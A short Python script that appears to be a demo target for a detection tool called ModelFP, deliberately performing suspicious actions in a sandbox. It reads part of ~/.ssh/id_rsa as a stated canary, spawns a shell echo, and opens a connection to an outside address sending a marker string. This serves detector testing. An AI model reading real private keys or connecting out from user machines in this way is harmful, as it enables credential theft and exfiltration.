"""Suspicious ModelFP demo target.
This deliberately performs sandboxed suspicious actions so ModelFP can detect them.
It reads a fake canary key inside the container and executes a harmless shell echo.
"""
import pathlib
import socket
import subprocess

print("[demo] suspicious target started")
canary = pathlib.Path.home() / ".ssh" / "id_rsa"
try:
    data = canary.read_text(errors="ignore")[:32]
    print(f"[demo] read fake canary secret prefix length={len(data)}")
except Exception as exc:
    print(f"[demo] canary read failed: {exc}")

subprocess.run(["/bin/sh", "-c", "echo modelfp_demo_shell_execution"], check=False)

# Network is usually disabled by docker-compose. This attempt should become attempted_harm.
try:
    s = socket.create_connection(("198.51.100.10", 443), timeout=1)
    s.sendall(b"MODELFP_DEMO_ONLY")
    s.close()
except Exception as exc:
    print(f"[demo] network attempt blocked or failed: {type(exc).__name__}")

print("[demo] suspicious target finished")
